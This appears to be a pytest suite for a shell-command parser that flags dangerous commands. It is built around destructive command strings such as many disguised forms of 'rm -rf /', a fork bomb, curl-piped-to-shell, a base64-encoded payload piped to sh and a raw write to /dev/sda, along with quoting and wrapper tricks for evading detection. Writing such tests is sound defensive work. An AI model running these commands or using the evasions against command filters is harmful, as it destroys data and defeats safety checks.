"""Parser tests: argv splitting, wrapper unwrapping, adversarial evasions."""

from __future__ import annotations

import pytest

from cmdbelt.parser import ParseResult, Unit, format_tree, parse


def cmds(r: ParseResult) -> list[str]:
    return [u.cmd for u in r.units]


def argvs(r: ParseResult) -> list[list[str]]:
    return [u.argv for u in r.units]


def find(r: ParseResult, cmd: str) -> Unit:
    for u in r.units:
        if u.cmd == cmd:
            return u
    raise AssertionError(f"no unit {cmd!r} in {[u.describe() for u in r.units]}")


# --------------------------------------------------------------------- basic splitting

SPLIT_CASES: list[tuple[str, list[list[str]]]] = [
    ("ls -la", [["ls", "-la"]]),
    ("ls && rm -rf build", [["ls"], ["rm", "-rf", "build"]]),
    ("ls; rm -rf build", [["ls"], ["rm", "-rf", "build"]]),
    ("ls || rm -rf build", [["ls"], ["rm", "-rf", "build"]]),
    ("ls | grep foo | wc -l", [["ls"], ["grep", "foo"], ["wc", "-l"]]),
    ("make &\nls", [["make"], ["ls"]]),
    ("(cd /x && rm -rf y)", [["cd", "/x"], ["rm", "-rf", "y"]]),
    ("{ ls; rm -rf y; }", [["ls"], ["rm", "-rf", "y"]]),
    ("echo 'a b' \"c d\" e\\ f", [["echo", "a b", "c d", "e f"]]),
    ('echo "it\'s"', [["echo", "it's"]]),
    (
        "git commit -m 'fix: thing' && git push",
        [["git", "commit", "-m", "fix: thing"], ["git", "push"]],
    ),
    ("ls # comment; rm -rf /", [["ls"]]),
    ("ls \\\n  -la", [["ls", "-la"]]),
    ("if true; then rm -rf x; fi", [["true"], ["rm", "-rf", "x"]]),
    ("while true; do sleep 1; done", [["true"], ["sleep", "1"]]),
    ("! grep -q x f", [["grep", "-q", "x", "f"]]),
    ("time make -j4", [["make", "-j4"]]),
    ("FOO=bar BAZ=1 make", [["make"]]),
    ("echo a 2>&1 >/dev/null", [["echo", "a"]]),
    ("cat file1 2> err.txt", [["cat", "file1"]]),
    ("ls -1|xargs", [["ls", "-1"], ["xargs"]]),
    ("ls&&ls", [["ls"], ["ls"]]),
]


@pytest.mark.parametrize("command,expected", SPLIT_CASES)
def test_split(command: str, expected: list[list[str]]) -> None:
    r = parse(command)
    assert not r.unparseable, format_tree(r)
    assert argvs(r) == expected


def test_assignment_only() -> None:
    r = parse("FOO=bar")
    assert len(r.units) == 1
    assert r.units[0].argv == []
    assert r.units[0].assignments == ("FOO=bar",)


def test_empty() -> None:
    assert parse("").units == []
    assert parse("   ").units == []


# --------------------------------------------------------------------- redirects


def test_redirect_targets() -> None:
    u = parse("echo x > ~/.bashrc").units[0]
    assert u.argv == ["echo", "x"]
    assert [(r.op, r.target) for r in u.redirects] == [(">", "~/.bashrc")]


def test_redirect_append_and_fd() -> None:
    u = parse("cmd 2>>/var/log/x.log").units[0]
    assert u.argv == ["cmd"]
    assert u.redirects[0].op == ">>"
    assert u.redirects[0].target == "/var/log/x.log"


def test_redirect_dev_sda() -> None:
    u = parse("cat image.iso >/dev/sda").units[0]
    assert u.redirects[0].target == "/dev/sda"


def test_heredoc_is_data() -> None:
    r = parse("cat <<EOF > out.txt\nrm -rf /\nEOF\nls")
    assert argvs(r) == [["cat"], ["ls"]]
    assert r.units[0].heredoc == "rm -rf /"
    assert r.units[0].redirects[0].target == "out.txt"


def test_heredoc_quoted_delim_and_dash() -> None:
    r = parse("sqlite3 db.sqlite <<-'SQL'\n\tDROP TABLE users;\n\tSQL")
    assert r.units[0].heredoc == "DROP TABLE users;"


def test_herestring() -> None:
    u = parse("cat <<< 'hello'").units[0]
    assert u.argv == ["cat"]
    assert u.redirects[0].op == "<<<"


# --------------------------------------------------------------------- wrappers

WRAP_CASES: list[tuple[str, list[str], tuple[str, ...]]] = [
    ("sudo rm -rf /", ["rm", "-rf", "/"], ("sudo",)),
    ("sudo -u root rm -rf /", ["rm", "-rf", "/"], ("sudo",)),
    ("sudo -E -H -- rm -rf /", ["rm", "-rf", "/"], ("sudo",)),
    ("sudo FOO=1 rm -rf /", ["rm", "-rf", "/"], ("sudo",)),
    ("doas rm -rf /", ["rm", "-rf", "/"], ("doas",)),
    ("env rm -rf /", ["rm", "-rf", "/"], ("env",)),
    ("env -i rm -rf /", ["rm", "-rf", "/"], ("env",)),
    ("env -i PATH=/bin rm -rf /", ["rm", "-rf", "/"], ("env",)),
    ("env -u HOME -- rm -rf /", ["rm", "-rf", "/"], ("env",)),
    ("/usr/bin/env rm -rf /", ["rm", "-rf", "/"], ("env",)),
    ("nohup rm -rf / &", ["rm", "-rf", "/"], ("nohup",)),
    ("timeout 10 rm -rf /", ["rm", "-rf", "/"], ("timeout",)),
    ("timeout -s KILL 5s rm -rf /", ["rm", "-rf", "/"], ("timeout",)),
    ("timeout --preserve-status 5 rm -rf /", ["rm", "-rf", "/"], ("timeout",)),
    ("nice -n 10 rm -rf /", ["rm", "-rf", "/"], ("nice",)),
    ("nice rm -rf /", ["rm", "-rf", "/"], ("nice",)),
    ("ionice -c 3 rm -rf /", ["rm", "-rf", "/"], ("ionice",)),
    ("command rm -rf /", ["rm", "-rf", "/"], ("command",)),
    ("builtin cd /", ["cd", "/"], ("builtin",)),
    ("exec rm -rf /", ["rm", "-rf", "/"], ("exec",)),
    ("\\rm -rf /", ["rm", "-rf", "/"], ()),
    ("/bin/rm -rf /", ["/bin/rm", "-rf", "/"], ()),
    ("'rm' -rf /", ["rm", "-rf", "/"], ()),
    ('r"m" -rf /', ["rm", "-rf", "/"], ()),
    (
        "sudo nohup env timeout 5 nice rm -rf /",
        ["rm", "-rf", "/"],
        ("sudo", "nohup", "env", "timeout", "nice"),
    ),
    ("setsid rm -rf /", ["rm", "-rf", "/"], ("setsid",)),
    ("stdbuf -oL rm -rf /", ["rm", "-rf", "/"], ("stdbuf",)),
    ("flock /tmp/l rm -rf /", ["rm", "-rf", "/"], ("flock",)),
    ("busybox rm -rf /", ["rm", "-rf", "/"], ("busybox",)),
    ("pkexec rm -rf /", ["rm", "-rf", "/"], ("pkexec",)),
    ("watch -n 1 rm -rf /", ["rm", "-rf", "/"], ("watch",)),
]


@pytest.mark.parametrize("command,argv,wrappers", WRAP_CASES)
def test_wrappers(command: str, argv: list[str], wrappers: tuple[str, ...]) -> None:
    r = parse(command)
    u = find(r, "cd") if "cd" in command else find(r, "rm")
    assert u.argv == argv
    assert u.wrappers == wrappers
    assert not u.unparseable


def test_command_v_is_query() -> None:
    u = parse("command -v rm").units[0]
    assert u.argv == ["command", "-v", "rm"]


def test_sudo_interactive_shell() -> None:
    u = parse("sudo -i").units[0]
    assert u.argv == ["sudo", "-i"]


def test_sudo_s_string() -> None:
    r = parse("sudo -s 'rm -rf /'")
    u = find(r, "rm")
    assert u.argv == ["rm", "-rf", "/"]
    assert "sudo -s" in u.wrappers


def test_su_c() -> None:
    r = parse("su - root -c 'rm -rf /'")
    u = find(r, "rm")
    assert u.argv == ["rm", "-rf", "/"]
    assert "su" in u.wrappers


# --------------------------------------------------------------------- nested shells

SHELL_CASES: list[str] = [
    "bash -c 'rm -rf /'",
    "sh -c 'rm -rf /'",
    "zsh -c 'rm -rf /'",
    "dash -c 'rm -rf /'",
    "bash -lc 'rm -rf /'",
    "bash -ec 'rm -rf /'",
    "bash -l -c 'rm -rf /'",
    "bash -o pipefail -c 'rm -rf /'",
    "bash --norc -c 'rm -rf /'",
    '/bin/bash -c "rm -rf /"',
    'bash -c "cd /tmp && rm -rf /"',
    "sudo bash -c 'rm -rf /'",
    "bash -c 'bash -c \"rm -rf /\"'",
    'sh -c \'sh -c "sh -c \\"rm -rf /\\""\'',
    "eval rm -rf /",
    "eval 'rm -rf /'",
    'eval "rm -rf /"',
    "nohup bash -c 'rm -rf /' &",
    "env -i sh -c 'rm -rf /'",
    "timeout 5 bash -c 'rm -rf /'",
    "script -q -c 'rm -rf /' /dev/null",
    "runuser -u root -c 'rm -rf /'",
]


@pytest.mark.parametrize("command", SHELL_CASES)
def test_nested_shell_finds_rm(command: str) -> None:
    r = parse(command)
    u = find(r, "rm")
    assert u.argv == ["rm", "-rf", "/"], format_tree(r)
    assert not u.unparseable


def test_bash_script_file_not_unwrapped() -> None:
    r = parse("bash ./deploy.sh --prod")
    assert argvs(r) == [["bash", "./deploy.sh", "--prod"]]


def test_bash_bare() -> None:
    assert argvs(parse("bash")) == [["bash"]]


def test_bash_c_with_variable_script_is_unparseable() -> None:
    r = parse('bash -c "$SCRIPT"')
    assert r.unparseable
    assert "dynamic shell script" in r.units[0].issues


def test_nested_shell_wrappers_recorded() -> None:
    u = find(parse("sudo bash -c 'rm -rf /'"), "rm")
    assert u.wrappers == ("sudo", "bash -c")


# --------------------------------------------------------------------- ssh


def test_ssh_remote_command() -> None:
    r = parse("ssh host 'rm -rf /'")
    assert cmds(r) == ["rm"]
    u = r.units[0]
    assert u.remote and u.argv == ["rm", "-rf", "/"]
    assert u.wrappers == ("ssh",)


def test_ssh_remote_unquoted() -> None:
    r = parse("ssh user@host sudo systemctl stop nginx")
    u = find(r, "systemctl")
    assert u.remote and u.wrappers == ("ssh", "sudo")


def test_ssh_options_skipped() -> None:
    r = parse("ssh -p 2222 -i ~/.ssh/id -o StrictHostKeyChecking=no -t root@h 'reboot'")
    u = find(r, "reboot")
    assert u.remote and u.argv == ["reboot"]


def test_ssh_interactive() -> None:
    r = parse("ssh host")
    assert argvs(r) == [["ssh", "host"]]
    assert not r.units[0].remote


def test_ssh_remote_pipeline_split() -> None:
    r = parse("ssh h 'ls; rm -rf /; echo done'")
    assert cmds(r) == ["ls", "rm", "echo"]
    assert all(u.remote for u in r.units)


def test_ssh_nested_ssh() -> None:
    r = parse("ssh a 'ssh b \"rm -rf /\"'")
    u = find(r, "rm")
    assert u.remote and u.wrappers == ("ssh", "ssh")


def test_ssh_clustered_flag_with_value() -> None:
    r = parse("ssh -tp 22 h 'rm -rf /'")
    assert find(r, "rm").remote


# --------------------------------------------------------------------- xargs / find


def test_xargs_rm() -> None:
    r = parse("ls | xargs rm -rf")
    u = find(r, "rm")
    assert u.argv == ["rm", "-rf"]
    assert u.dynamic_args and "xargs" in u.wrappers


def test_xargs_with_options() -> None:
    r = parse("find . -name '*.pyc' -print0 | xargs -0 -n1 -P4 rm -f")
    u = find(r, "rm")
    assert u.argv == ["rm", "-f"] and u.dynamic_args


def test_xargs_I() -> None:
    u = find(parse("cat list | xargs -I{} rm -rf {}"), "rm")
    assert u.argv == ["rm", "-rf", "{}"] and u.dynamic_args


def test_xargs_default_echo() -> None:
    u = find(parse("ls | xargs"), "xargs")
    assert u.via == "xargs"


def test_find_delete() -> None:
    u = parse("find / -name '*.log' -delete").units[0]
    assert u.cmd == "find" and "-delete" in u.argv


def test_find_exec() -> None:
    r = parse("find . -type f -exec rm -rf {} \\;")
    assert cmds(r) == ["rm", "find"]
    u = find(r, "rm")
    assert u.argv == ["rm", "-rf", "{}"] and u.via == "find-exec" and u.dynamic_args


def test_find_exec_plus() -> None:
    r = parse("find /etc -exec chmod 777 {} +")
    u = find(r, "chmod")
    assert u.argv == ["chmod", "777", "{}"]


def test_find_execdir_sh() -> None:
    r = parse("find . -execdir sh -c 'rm -rf /' \\;")
    assert find(r, "rm").argv == ["rm", "-rf", "/"]


# --------------------------------------------------------------------- substitutions


def test_command_substitution_units() -> None:
    r = parse("echo $(rm -rf /)")
    assert cmds(r) == ["rm", "echo"]
    assert find(r, "rm").via == "substitution"
    assert find(r, "echo").dynamic_args


def test_backtick_substitution() -> None:
    r = parse("echo `rm -rf /`")
    assert cmds(r) == ["rm", "echo"]


def test_substitution_in_double_quotes() -> None:
    r = parse('echo "today: $(rm -rf /)"')
    assert "rm" in cmds(r)


def test_substitution_in_single_quotes_is_literal() -> None:
    r = parse("echo '$(rm -rf /)'")
    assert cmds(r) == ["echo"]
    assert not r.units[0].dynamic_args


def test_nested_substitution() -> None:
    r = parse("echo $(echo $(rm -rf /))")
    assert "rm" in cmds(r)


def test_process_substitution() -> None:
    r = parse("diff <(rm -rf /) <(ls)")
    assert set(cmds(r)) == {"rm", "ls", "diff"}


def test_docker_rm_substitution() -> None:
    r = parse("docker rm -f $(docker ps -aq)")
    u = find(r, "docker") if r.units[0].argv[:2] != ["docker", "ps"] else r.units[1]
    assert any(x.argv == ["docker", "ps", "-aq"] for x in r.units)
    assert any(x.argv[:3] == ["docker", "rm", "-f"] and x.dynamic_args for x in r.units)
    assert u is not None


def test_arithmetic_is_not_substitution() -> None:
    r = parse("echo $((1+2))")
    assert cmds(r) == ["echo"]
    assert r.units[0].dynamic_args


# --------------------------------------------------------------------- variables / unparseable


def test_variable_command_name_unparseable() -> None:
    r = parse("$CMD -rf /")
    assert r.unparseable and "dynamic command name" in r.units[0].issues


def test_var_in_braces_command_unparseable() -> None:
    r = parse("${RM} -rf /")
    assert r.unparseable


def test_substituted_command_name_unparseable() -> None:
    r = parse("$(which rm) -rf /")
    assert r.unparseable
    assert "which" in cmds(r)  # inner still seen


def test_var_arg_is_dynamic() -> None:
    u = parse("rm -rf $DIR").units[0]
    assert u.dynamic_args and u.dynamic_argv == ("$DIR",)


def test_var_arg_in_dquotes_is_dynamic() -> None:
    u = parse('rm -rf "$HOME/x"').units[0]
    assert u.dynamic_args


def test_unterminated_quote() -> None:
    r = parse("echo 'oops")
    assert r.unparseable


def test_unbalanced_paren() -> None:
    assert parse("(ls").unparseable
    assert parse("ls)").unparseable


def test_function_definition_unparseable_fork_bomb() -> None:
    r = parse(":(){ :|:& };:")
    assert r.unparseable
    assert "function definition" in r.issues


def test_function_keyword() -> None:
    assert parse("function f { rm -rf /; }").unparseable


def test_case_statement_unparseable() -> None:
    assert parse("case $x in a) ls;; esac").unparseable


def test_for_loop_body_is_parsed() -> None:
    r = parse("for f in *.txt; do rm -rf $f; done")
    assert "rm" in cmds(r)
    assert "control flow (for/select)" in r.issues
    assert not r.unparseable


def test_glob_args_recorded() -> None:
    u = parse("rm -rf *").units[0]
    assert u.glob_args == ("*",)
    u2 = parse("rm -rf '*'").units[0]
    assert u2.glob_args == ()


def test_no_command_recognized() -> None:
    r = parse(";")
    assert r.unparseable


# --------------------------------------------------------------------- pipelines


def test_pipe_links() -> None:
    r = parse("curl -s https://x | sh")
    assert r.units[0].pipe_to == "sh"
    assert r.units[1].pipe_from == "curl"


def test_pipe_links_through_wrapper() -> None:
    r = parse("curl -s https://x | sudo bash")
    assert find(r, "bash").pipe_from == "curl"


def test_pipe_base64_sh() -> None:
    r = parse("echo cm0gLXJmIC8= | base64 -d | sh")
    assert find(r, "sh").pipe_from == "base64"


def test_pipe_ampersand() -> None:
    r = parse("make |& tee log")
    assert cmds(r) == ["make", "tee"]


# --------------------------------------------------------------------- misc adversarial


@pytest.mark.parametrize(
    "command",
    [
        "r''m -rf /",
        "rm -r -f /",
        "rm --recursive --force /",
        "rm -fr /",
        "rm -rf //",
        "rm -rf /*",
        "sudo -- rm -rf /",
        "\\r\\m -rf /",
        "env -S 'rm -rf /'",
        'sh -c "\\$(echo rm) -rf /"',
    ],
)
def test_rm_variants_parse(command: str) -> None:
    r = parse(command)
    # either rm is visible, or we fail closed
    assert "rm" in cmds(r) or r.unparseable, format_tree(r)


def test_describe_and_tree() -> None:
    r = parse("ssh h 'sudo rm -rf /' | tee x")
    txt = format_tree(r)
    assert "REMOTE" in txt and "via ssh>sudo" in txt


def test_deep_nesting_fails_closed() -> None:
    cmd = "rm -rf /"
    for _ in range(12):
        cmd = f"bash -c {cmd!r}"
    r = parse(cmd)
    assert r.unparseable or "rm" in cmds(r)


def test_normalized() -> None:
    assert parse("echo 'a b'").units[0].normalized() == "echo 'a b'"
